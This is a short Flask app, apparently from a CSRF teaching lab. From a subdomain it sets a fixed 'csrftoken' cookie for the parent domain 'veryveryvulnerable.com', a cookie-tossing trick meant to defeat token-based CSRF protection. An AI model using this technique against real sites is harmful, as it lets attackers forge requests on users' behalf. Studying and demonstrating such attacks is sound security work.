from flask import Flask
from flask import make_response
from flask import render_template


app = Flask(__name__)


@app.route('/')
def uhoh():
    response = make_response(render_template('csrf4.html'))
    # as a subdomain, we can set a cookie for the
    # whole domain (and all it's other subdomains)
    response.set_cookie(
        'csrftoken',
        'A' * 64, 
        domain='veryveryvulnerable.com')
    return response


if __name__ == '__main__':
    app.run()